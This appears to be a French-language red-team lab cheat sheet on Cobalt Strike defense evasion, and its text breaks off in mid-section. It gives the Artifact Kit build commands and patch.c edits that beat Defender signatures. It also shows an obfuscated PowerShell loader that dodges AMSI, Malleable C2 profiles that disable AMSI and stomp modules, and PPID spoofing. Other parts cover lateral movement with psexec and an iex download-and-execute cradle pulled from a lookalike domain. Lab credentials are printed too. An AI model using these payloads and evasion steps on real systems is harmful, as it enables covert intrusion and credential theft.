# Defense Evasion — Comprendre les contrôles de détection

* Artifacts compilés
* Artifacts de scripts
* Mémoire du Beacon
* Comportement des commandes Beacon
* Cohérence des opérations Post-Exploitation
* Détections sur les lignes de commande

---

## Named Pipes — Deux paramètres distincts

> **Attention :** le listener SMB et les opérations post-exploitation disposent de deux paramètres de named pipes différents.

| Usage | Configuration | Valeur du lab | Remarque |
|------|-----------------|-------------|----------|
| **Communications C2 SMB** | Paramètres du listener dans Cobalt Strike | `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337` | Nom défini dans les paramètres du listener |
| **Sortie fork-and-run** | `post-ex.pipename` dans le Malleable C2 Profile | `dotnet-diagnostic-#####, ########-####-####-####-############` | Valeur utilisée dans le lab — aucune garantie de non-détection |

### Listener SMB — Formats de named pipes

```
# Good — blends with legitimate Windows named pipes:
wkssvc
ntsvcs-<random digits>
netlogon-<random digits>

# Bad — all CS defaults, all detected:
TSVCPIPE-*
msagent_*
postex_*
MSSE-*-server
```

### Format des caractères génériques de `post-ex.pipename`

```
set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
# '#' = random digit substituted at runtime by CS
# Comma-separated = two candidate names, CS uses first available
# dotnet-diagnostic-* blends with .NET CLR runtime pipes present on any Windows/.NET system
```

---

## Compiler de nouveaux artifacts    

```
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

### Signification des paramètres

```
./build.sh <technique> <allocator> <magic_mz_x86> <magic_mz_x64> <rdll_x86> <rdll_x64> <stack_spoof> <output_dir>
```

| # | Paramètre | Valeur d’exemple | Fonction |
|---|-----------|-----------------|---------|
| 1 | `technique` | `mailslot` | Méthode IPC utilisée pour transférer les données au module. Options : `mailslot`, `pipe`, `readfile` |
| 2 | `allocator` | `VirtualAlloc` | Méthode d’allocation mémoire. Options : `VirtualAlloc`, `MapViewOfFile`, `HeapAlloc` |
| 3 | `magic_mz_x86` | `351363` | Remplace les octets magiques `MZ` (4D5A) de l’en-tête DOS x86 ; ils peuvent être restaurés à l’exécution |
| 4 | `magic_mz_x64` | `0` | Paramètre équivalent pour x64 ; `0` conserve la valeur par défaut |
| 5 | `rdll_x86` | `false` | Active le chargement Reflective DLL du payload x86 |
| 6 | `rdll_x64` | `false` | Active le chargement Reflective DLL du payload x64 |
| 7 | `stack_spoof` | `none` | Paramètre de pile d’appels. Options : `none` or a spoofing technique name |
| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Dossier de sortie des artifacts, accessible via `Script Manager` et `artifact.cna` |

### Options de la technique

| Technique | Fonctionnement | OPSEC |
|-----------|-------------|-------|
| `mailslot` | Transfert des données par IPC Windows mailslot | Moins fréquent dans certains référentiels de signatures |
| `pipe` | Communication par named pipe | Fréquent ; plusieurs règles de détection existent |
| `readfile` | Lit le contenu depuis un fichier temporaire | OPSEC-CAUTION — écrit sur le disque |

### Options d’allocation mémoire

| Allocateur | Remarque OPSEC |
|-----------|-----------|
| `VirtualAlloc` | Très utilisé et souvent surveillé par les EDR |
| `MapViewOfFile` | Mapping mémoire adossé à un fichier ; surveillance toujours possible |
| `HeapAlloc` | Allocation sur le tas, au comportement différent des pages RWX |

### Comprendre `magic_mz`

Les fichiers PE Windows débutent normalement par les octets hexadécimaux `4D 5A`, correspondant à **MZ** à l’offset `0x00` :

```
Offset 0x00:  4D 5A 90 00 03 00 ...
              ^^ ^^
              M  Z   ← Defender looks for this at byte 0
```

Les en-têtes PE sont des informations analysables par les moteurs antivirus. Dans ce scénario, `magic_mz` modifie la valeur de l’en-tête de l’artifact :

```
351363 decimal = 0x055C03 hex → first two bytes: 03 5C

On disk: 03 5C ...  ← looks like garbage, not a PE → passes static scan
```

Le code du lab restaure les octets d’origine lors de l’exécution :

```
03 5C ...  →  4D 5A ...  (MZ restored → valid PE loaded and executed)
```

| Étape | Octets à l’offset 0 | Observation possible |
|-------|-------------------|-------------------|
| Sur le disque / analyse initiale | `03 5C` (custom value) | En-tête PE non reconnu sous sa forme habituelle |
| Pendant l’exécution (en-tête restauré) | `4D 5A` (MZ restored) | Exécutable présent en mémoire |

`magic_mz_x64 = 0` conserve l’en-tête MZ d’origine sur x64. Les autres valeurs modifient le comportement étudié dans le lab.

---

**Remarque :** `mailslot`, `HeapAlloc` et `magic_mz` correspondent à des options de l’Artifact Kit ; leur visibilité réelle dépend de l’environnement et des contrôles EDR.

Après la compilation, charger le script Aggressor :

```
Cobalt Strike → Script Manager → Load → <output_dir>/artifact.cna
```

## ThreatCheck  

```dos
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe" 
```  

>ThreatCheck indique les segments signalés par Defender et, lorsqu’il est disponible, un offset hexadécimal.

## Ghidra  

```
ghidraRun.bat
```  

### Étapes d’analyse dans Ghidra :  

1. Créer un projet  

<img src="/images/ghidra01.png" width=600>  

2. Importer le fichier  

<img src="/images/ghidra02.png" width=400>  

3. Ouvrir le fichier importé par double-clic

<img src="/images/ghidra03.png" width=400>  

4. Lancer l’analyse du fichier, puis utiliser l’offset de ThreatCheck dans le menu de navigation **Go to**.  

```
file(0x9CF)
```  

<img src="/images/ghidra04.png" width=600>  

5. Consulter le code décompilé dans le panneau de droite et comparer avec les zones détectées.  

<img src="/images/ghidra05.png" width=800>  

6. Relever les octets hexadécimaux de ThreatCheck, puis les rechercher dans **Search > Memory** de Ghidra pour identifier la zone concernée.  

<img src="/images/ghidra06.png" width=700> 

7. Dans l’exemple du lab, la zone correspond à une boucle du code source. Il faut établir la correspondance entre code décompilé et fichier d’origine.

<img src="/images/ghidra07.png" width=600> 

8. Dans Visual Studio Code, utiliser **Edit > Find in Files** pour retrouver la fonction concernée.  

<img src="/images/ghidra08.png" width=600> 

9. Le lab compare deux variantes d’une boucle afin d’étudier l’effet de la compilation sur les signatures détectées.  

>Compiler de nouveau les templates de l’Artifact Kit, puis relancer ThreatCheck pour comparer les résultats.    
>Noter chaque résultat de ThreatCheck et le comparer aux analyses précédentes.

### ThreatCheck et Ghidra — Méthode d’analyse du lab

**Déroulement du contrôle :**

**1. ThreatCheck — relever l’offset signalé :**
```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
# Output: Byte[]: 0x00004C20
#         HEX: 31 C0 48 FF C8 ...   ← these are the exact bytes Defender matched
```
L’absence de sortie ne prouve pas l’absence de détection ; une sortie signale une zone à examiner.

**2. Ghidra — accéder à l’offset :**
```
Window → Go To
Enter: 0x4C20    ← use the hex offset from ThreatCheck (must prefix with 0x)
```
La vue désassemblée présente les octets concernés ; le décompilateur affiche une représentation proche du C.

**3. Identifier la boucle concernée :**
Dans l’exemple, la zone correspond à une boucle `for` de traitement XOR dans `patch.c` :
```c
// Signatured — Defender has this bytecode pattern flagged:
for ( int x = 0; x < length; x++ ) {
    buffer[x] = buffer[x] ^ key[x % 8];
}
```
Deux occurrences figurent dans `patch.c` :
- **Line ~45** — boucle du binaire service `.svc.exe`
- **Line ~116** — boucle de l’exécutable standard

**4. Identifier la portion correspondante dans VS Code :**
```
VSCode: File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
Open: src-common\patch.c
```

**Exemple à la ligne ~45 :**
```c
// NEW — backward while-loop (compiles to different bytecode):
int x = length;
while ( x-- ) {
    *( (char *)buffer + x ) = *( (char *)buffer + x ) ^ key[ x % 8 ];
}
```

**Exemple à la ligne ~116 :**
```c
int x = length;
while ( x-- ) {
    *( (char *)ptr + x ) = *( (char *)buffer + x ) ^ key[ x % 8 ];
}
```
> Conserver les versions précédentes dans le suivi Git afin de pouvoir comparer les changements.

**5. Recompiler :**
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

**6. Relancer ThreatCheck :**
```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```
- Aucune sortie → le test n’a pas signalé de signature sur cet échantillon.
- Nouvel offset → une autre portion est signalée ; comparer les résultats du test.

**Observations du lab :** plusieurs compilations et contrôles sont présentés ; leur nombre dépend des échantillons.

**Différence de code compilé :** une boucle `while` et une boucle `for` équivalentes peuvent produire des séquences d’instructions différentes. Le lab étudie cette variation dans les résultats d’analyse de ThreatCheck.  

## Resource Kit — Scripts  

>Compiler une nouvelle version des ressources sans modification du code.  

```
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```  

>Analyser le template à l’aide du mode AMSI de ThreatCheck.  

```ps1
.\C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

>Dans le lab, comparer les résultats après une modification de concaténation de chaînes.  

```ps1
('Syst'+'em.dll')
```  

>L’analyse signale ensuite l’utilisation de `Marshal.Copy` ; le lab présente une variante basée sur une API mémoire native.  

```ps1
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```  

>Les contrôles de ThreatCheck ne représentent pas toutes les méthodes de détection ; une autre variante du script est présentée.  
>[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)  

>Le bloc suivant porte sur le contenu de `compress.ps1`.  

```
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```  

>Exemple de sortie de la transformation de tokens :  

```
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```  

>Le scénario poursuit avec une version modifiée de `compress.ps1`, suivie d’une nouvelle compilation et analyse.  

## Mémoire du Beacon

Les artifacts `.exe`, `.dll` et `.ps1` du lab chargent le Beacon en mémoire. Les antivirus peuvent analyser la mémoire après exécution ; les alertes peuvent inclure des indicateurs de scan mémoire.

### Mémoire RWX — comprendre le risque de détection

L’allocation d’une région `PAGE_EXECUTE_READWRITE` (RWX) peut constituer un indicateur surveillé. Certaines applications légitimes utilisent également ce type de pages.

```
stage {
    set userwx "false";
    # Allocates RW → copies Beacon → sets per-section perms:
    # .text = RX | .rdata = R | .data = RW
}
```

### En-têtes DLL — signature PE en mémoire

Les en-têtes PE (DOS et NT) restent identifiables en mémoire. Leur présence constitue une caractéristique analysable par les outils de sécurité.

```
stage {
    set copyheaders "false";   # Only .text and .data sections remain
}
```

### Module Stomping — relation avec un module chargé

**Contexte :** une région mémoire sans fichier module correspondant sur disque peut apparaître comme une anomalie dans les outils d’inspection.

Le lab décrit le mapping d’une DLL et l’observation de son association aux régions mémoire.

```
stage {
    set module_x64 "Hydrogen.dll";   # Must be ≥ 512KB to fit Beacon
    set module_x86 "Hydrogen.dll";
}
```

Les exemples utilisent des DLL de `C:\Windows\System32\`. Le comportement dépend de la taille, des sections PE et de leur mapping.

### Chaînes de caractères dans le Beacon

Examiner la DLL Beacon brute pour identifier les chaînes qu’elle contient :

```javascript
// beacon.cna — dump raw DLL via BEACON_RDLL_GENERATE hook
on BEACON_RDLL_GENERATE {
    local('$handle');
    $handle = openf(">beacon_raw.x64.dll");
    writeb($handle, $2);
    closef($handle);
}
```

```bash
# In WSL — dump strings
strings beacon_raw.x64.dll | less
```

Le scénario présente les paramètres du bloc `stage` du Malleable C2 Profile :

```
stage {
    transform-x64 {
        strrep "original string" "replacement";   # New string must be ≤ original length
        # Raw bytes:
        strrep "\x4d\x5a" "\x4e\x5b";
    }
    transform-x86 {
        # Same as x64
    }
}
```

> **Attention :** certaines chaînes sont nécessaires au serveur web interne du Beacon et aux fonctions `powershell-import`, `powerpick` et `psinject`. Leur modification peut empêcher ces commandes de fonctionner.

### Exemple de bloc `stage` du lab

```
stage {
    set userwx      "false";
    set copyheaders "false";
    set obfuscate   "true";
    set cleanup     "true";
    set module_x64  "Hydrogen.dll";
    set module_x86  "Hydrogen.dll";
    transform-x64 {
        # Add strrep entries after strings analysis
    }
}
```

---

## Comportement des commandes Beacon — Catégories OPSEC

### Catégories de commandes

| Catégorie | Fonctionnement | OPSEC |
|-------|-------------|-------|
| **Housekeeping** | Action côté client ou tâche simple du Beacon | Minimal |
| **API-only** | API Windows exécutées dans le thread du Beacon | SAFE — sans nouveau processus |
| **Inline (BOF)** | Code C compilé exécuté dans le thread du Beacon | SAFE — sans nouveau thread |
| **Fork & Run (spawn)** | Création d’un processus temporaire avec sortie via named pipe | CAUTION — nouveau processus, thread et named pipe |
| **Fork & Run (explicit)** | Exécution dans un processus existant | CAUTION — nouveau thread et named pipe |
| **Process execution** | Exécution d’un processus depuis le disque | UNSAFE — processus enfant observable |
| **Service creation** | Crée un service Windows | UNSAFE — Event 7045 |

### API Windows seules (OPSEC-SAFE)
```
pwd  cd  ls  download  upload  getuid  make_token
steal_token  rev2self  kill  exit
```

### BOF / Inline (OPSEC-SAFE — runs in beacon thread, sans nouveau thread)
```
clipboard  getsystem  kerberos_ticket_use  reg  runasadmin uac-cmstplua
jump psexec (BOF component)
```

> L’allocation et la libération de mémoire des BOF dépendent notamment des paramètres `process-inject`.

### Fork-and-run — Création de processus (OPSEC-CAUTION)
```
execute-assembly    # .NET assembly in memory via sacrificial process
powerpick           # Unmanaged PowerShell — no powershell.exe, but spawns spawnto proc
```

### Fork-and-run — Processus explicite (OPSEC-CAUTION)
```
psinject            # powerpick into a specified existing process
```

### Fork-and-run — Deux modes
```
portscan  keylogger  printscreen  desktop  mimikatz
```

### Exécution de processus (OPSEC-UNSAFE)
```
execute    # No output
run        # With output
runas      # Alternate credentials
runu       # Spoofed parent PID
shell      # Via cmd.exe
powershell # Via powershell.exe
```

### Création de service (OPSEC-UNSAFE — événement 7045)
```
elevate svc-exe
jump psexec / psexec64 / psexec_psh
remote-exec psexec
```

> **Paramètre spawnto des services :** dans le scénario, certains payloads de services utilisent `rundll32` par défaut. Les variables d’environnement peuvent être interprétées différemment sous SYSTEM ; `ak-settings` définit un chemin explicite dans l’Artifact Kit.

### Malleable C2 — Bloc `process-inject`
Ce bloc définit les paramètres associés aux BOF et aux opérations fork-and-run :

```
process-inject {
    set startrwx    "false";
    set userwx      "false";
    set min_alloc   "16700";
    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x1000";
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
```

### Malleable C2 — Bloc `post-ex`
Ce bloc définit les paramètres des processus temporaires et des DLL post-exploitation :

```
post-ex {
    set amsi_disable  "true";
    set spawnto_x64   "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86   "%windir%\\syswow64\\dllhost.exe";
    set obfuscate     "true";
    set smartinject   "true";
    set thread_hint   "ntdll!RtlUserThreadStart+0x1000";
}
```

---

## Post-Exploitation — PPID et spawnto

### Comprendre le contexte

Un Beacon hébergé par `msedge.exe` qui lance `cmd.exe` ou `powershell.exe` peut présenter une arborescence de processus inhabituelle.

**Principe :** `post-ex.spawnto` fournit une valeur par défaut. L’interprétation de chaque commande doit tenir compte du processus hébergeant le Beacon.

### PPID Spoofing — `shell` et `run`

```
beacon> process_browser                 # GUI tab — find PID of desired parent (e.g. explorer.exe), right-click → steal token / inject
beacon> ppid <explorer PID>
beacon> shell whoami                    # Appears as child of explorer.exe
beacon> run net user
```

### Paramètres spawnto — Fork-and-run

```
beacon> ppid <explorer PID>
beacon> spawnto x64 %windir%\sysnative\notepad.exe
beacon> execute-assembly Rubeus.exe kerberoast /nowrap
```

### Cohérence des processus

| Processus du Beacon | Parent PPID présenté | Processus spawnto |
|--------------------|------------------------|---------------------|
| `msedge.exe` | `explorer.exe` | `msedge.exe` (autre instance) ou `dllhost.exe` |
| `outlook.exe` | `explorer.exe` | `dllhost.exe` / `msiexec.exe` |
| `svchost.exe` | `services.exe` | `svchost.exe` / `dllhost.exe` |

Les communications HTTP/S doivent être analysées dans le contexte du processus et de l’activité réseau réellement attendue.

---

## Détection des lignes de commande (Kernel Callbacks)

### Blocage à la création d’un processus

```
Kernel: PsSetCreateProcessNotifyRoutineEx callback
Struct: PS_CREATE_NOTIFY_INFO
  → ImageFileName   (executable path)
  → CommandLine     (full command line — inspected for abuse patterns)
  → CreationStatus  (driver sets STATUS_ACCESS_DENIED to block)
```

Dans le lab, un blocage peut apparaître sous la forme de l’erreur **Access Denied**, sans alerte antivirus explicite dans la console.

### Comportements bloqués dans le lab

| Commande | Action interne | Comportement bloqué |
|---------|----------------|----------------|
| `pth` | Mimikatz `sekurlsa::pth` | Impersonation de named pipe et arguments Mimikatz |
| `uac-schtasks` (Elevate Kit) | `schtasks.exe /SilentCleanup` | Argument SilentCleanup de la commande schtasks.exe |

### Comparer les mécanismes et leurs effets

Les Kernel Callbacks peuvent observer ou bloquer certaines créations de processus. Le tableau du lab compare plusieurs mécanismes, dont les effets doivent être évalués séparément :

| Comportement concerné | Autre mécanisme étudié |
|---------|------------|
| `schtasks.exe /SilentCleanup` | API COM associée au déclenchement de tâches |
| `pth` (Mimikatz CLI) | `Rubeus.exe createnetonly` + `ptt` pour l’impersonation de token |
| Direct LSASS dump CLI tools | `krb_dump` (Kerbeus-BOF) — API Kerberos sans lecture directe de la mémoire LSASS |

Les seuls paramètres du profil C2 ne suffisent pas à décrire le comportement observable des opérations post-exploitation.  
Évaluer chaque commande selon les processus, événements et connexions réseau qu’elle peut produire.  

---

## Enchaînement des vérifications Defense Evasion

```
1. Build Artifact Kit
   → ./build.sh <technique> VirtualAlloc ... ./custom-artifacts
   → C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f artifact64big.exe -e Defender
   → Fix signature in patch.c (recompile to different bytecode)
   → Repeat until clean
   → Load artifact.cna in CS Script Manager

2. Build Resource Kit
   → ./build.sh ./custom-resources
   → C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f template.x64.ps1 -e AMSI -t Script
   → Fix PS1 (string concat, replace Marshal.Copy, obfuscate compress.ps1)
   → Load resources.cna in CS Script Manager

3. Malleable C2 Profile
   → stage { userwx=false, copyheaders=false, module_x64, obfuscate=true }
   → post-ex { amsi_disable=true, spawnto_x64=dllhost.exe }
   → process-inject { userwx=false, execute methods }

4. Test beacon in lab with Defender ON → confirm callback + survival

5. Per-command before execution:
   beacon> ppid <appropriate parent PID>
   beacon> spawnto x64 <contextually appropriate process>
```

---

## Aide-mémoire OPSEC

```
SAFE:    inline-execute (BOF) | API-only | steal_token | rev2self | powerpick
CAUTION: execute-assembly | portscan | mimikatz (fork&run) | dcsync
UNSAFE:  shell | powershell | run | runas | jump psexec | service creation
```

### Liste de contrôle Defender

- [ ] Résultat de ThreatCheck pour les templates Artifact Kit
- [ ] Résultat de ThreatCheck pour les templates PowerShell (AMSI)
- [ ] `stage.userwx false` — pas de mémoire RWX dans le scénario
- [ ] `stage.copyheaders false` — gestion des en-têtes PE en mémoire
- [ ] `stage.module_x64` set — vérification du module associé à la région mémoire
- [ ] chaînes de la DLL Beacon examinées (`strings beacon_raw.x64.dll`)
- [ ] configuration spawnto documentée par rapport à `rundll32.exe`
- [ ] configuration PPID examinée avant les opérations post-exploitation

---

## Configuration rapportée dans le lab — Aide-mémoire

> Valeurs relevées dans le lab ZPS Defence Evasion. Les résultats des tests ne prouvent pas un comportement identique dans un autre environnement.

### Team Server — Emplacement du profil et redémarrage

```bash
ssh attacker@10.0.0.5          # Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile            # Edit profile here

# Restart team server (Docker)
sudo /usr/bin/docker restart cobaltstrike-cs-1

# Verify no profile errors
sudo /usr/bin/docker logs cobaltstrike-cs-1
```

### Malleable C2 — Bloc `stage` du lab

```
stage {
    set userwx         "false";
    set cleanup        "true";
    set copy_pe_header "false";
    set module_x64     "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
```

> `strrep` remplace des chaînes dans la DLL Beacon avant son chargement. L’exemple du lab modifie l’octet `\x00` en `\x01`.

---

### Malleable C2 — Bloc `post-ex` du lab

```
post-ex {
    set spawnto_x64  "%windir%\\sysnative\\werfault.exe";
    set cleanup      "true";
    set pipename     "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint  "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}
```

**Paramètres principaux :**
| Paramètre | Valeur | Explication |
|---------|-------|-----|
| `spawnto_x64` | `werfault.exe` | Windows Error Reporting : processus système présent dans certaines activités Windows |
| `pipename` | `dotnet-diagnostic-*` | Format ressemblant aux named pipes de diagnostic .NET |
| `thread_hint` | `ntdll.dll!RtlUserThreadStart+0x2c` | Valeur d’indication du point d’entrée d’un thread dans ntdll |
| `amsi_disable` | `true` | Paramètre de désactivation AMSI des DLL post-exploitation du lab |

**Syntaxe `strrepex` :** remplacement de chaîne limité au module DLL post-exploitation.
```
strrepex "<Module>" "<original string>" "<replacement>";
# Module = "PowerPick" or "ExecuteAssembly" — targets specific post-ex DLL
# Replaces error strings that Defender signatures target in those DLLs
```

---

### Malleable C2 — Bloc `process-inject` du lab

```
process-inject {
    set allocator      "VirtualAllocEx";
    set bof_allocator  "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc      "8192";
    set startrwx       "false";
    set userwx         "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

**Paramètres principaux :**
| Paramètre | Valeur | Explication |
|---------|-------|-----|
| `allocator` | `VirtualAllocEx` | Allocation mémoire distante utilisée dans le scénario |
| `bof_allocator` | `VirtualAlloc` | Allocation locale pour les BOF |
| `bof_reuse_memory` | `true` | Réutilisation de mémoire préalablement allouée aux BOF |
| `startrwx` / `userwx` | `false` | Absence de pages RWX selon les réglages présentés |
| `execute` methods | 4 options listed | Cobalt Strike examine les méthodes dans l’ordre indiqué |

---

### Artifact Kit — Étapes du lab

**1. Examiner `patch.c` dans VS Code**

```
File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
Open: src-common\patch.c
```

**Ligne ~45 :** exemple de boucle du payload `svc.exe` :
```c
// OLD (signatured for loop):
// for ( int x = 0; x < length; x++ ) { ... }

// NEW (backwards while loop — different bytecode):
x = length;
while ( x-- ) {
    * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

**Ligne ~116 :** exemple de boucle du payload `.exe` classique :
```c
// OLD (signatured for loop):
// for ( int x = 0; x < length; x++ ) { ... }

// NEW:
int x = length;
while ( x-- ) {
    * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

> Conserver l’historique Git du code précédent pour faciliter la comparaison et le retour arrière.

**2. Compiler dans WSL**

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

# Run without args first to confirm minimum stage size for current CS release:
./build.sh

# Build with mailslot bypass:
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

Vérification de la sortie de compilation :
```
[Artifact Kit] [+] You have a x86_64 minge — I will recompile the artifacts
[Artifact Kit] [-] Using allocator: VirtualAlloc
[Artifact Kit] [-] Using STAGE size: 351363
[Artifact Kit] [+] The artifacts for the bypass technique 'mailslot' are saved in '...'
```

**3. Charger dans Cobalt Strike**

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

**4. Contrôler avec ThreatCheck après compilation**

```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
# Clean = no output. Detected = offset + hex bytes → go fix in patch.c → rebuild
```

---

### Resource Kit — Étapes du lab

**1. Build in WSL**

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

**2. Examiner `template.x64.ps1` dans VS Code**

```
File > Open Folder → C:\Tools\cobaltstrike\custom-resources
Open: template.x64.ps1
```

**Ligne 5 :** exemple de modification de la chaîne `System.dll` :
```powershell
# Before:
.Equals('System.dll')
# After:
.Equals('Sys'+'tem.dll')
```

**Ligne 32 :** variante utilisant `WriteProcessMemory` à la place de `Marshal.Copy` :
```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address kernel32.dll WriteProcessMemory),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
)
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

**3. Examiner la version modifiée de `compress.ps1`** à partir d’Invoke-Obfuscation :

```powershell
# Obfuscated compress.ps1 — do NOT change %%DATA%% placeholder:
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

> `%%DATA%%` est un espace réservé par Cobalt Strike pour les données du payload. Il doit conserver son nom pour que le template fonctionne.

**4. Analyse AMSI avec ThreatCheck**

```cmd
.\C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
# Clean = "No threat found". Detected = fix the flagged line → re-scan
```

**5. Charger dans Cobalt Strike**

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-resources\resources.cna
```

---

### Paramètre spawnto des payloads de service — `ak-settings`

Dans le scénario, certains payloads de service utilisent `rundll32.exe` par défaut. Les variables d’environnement peuvent être interprétées différemment sous SYSTEM ; l’Artifact Kit accepte un chemin explicite :

```
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

Étape Lateral Movement présentée dans le lab :
```
beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> jump psexec64 lon-ws-1 smb
```

---

### Test — Distribution web d’un script

```
CS GUI: Attacks > Scripted Web Delivery
Select: http listener → Launch → copy URL
```

Sur la workstation du lab (PowerShell) :
```powershell
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/<uri>")
```

Vérifier dans Cobalt Strike la connexion du nouveau Beacon et consulter les résultats de `getuid` et `ps`.

---

### En-tête Host du listener HTTP — `www.bleepincomputer.com`

> **Critère OPSEC évoqué :** les communications sortantes de processus inhabituels et l’en-tête HTTP Host peuvent être examinés.

Le paramètre `HTTP Hosts` / `HTTP Host (Stager)` du listener Cobalt Strike définit l’en-tête HTTP `Host:` utilisé pour les callbacks et les demandes de staging. L’adresse de la connexion TCP reste celle du team server.

```
RAW IP (avoid — obvious C2):
  Beacon HTTP request:  Host: 10.0.0.5
  SIEM/proxy sees:      Internal host making HTTP requests to a raw IP → flagged

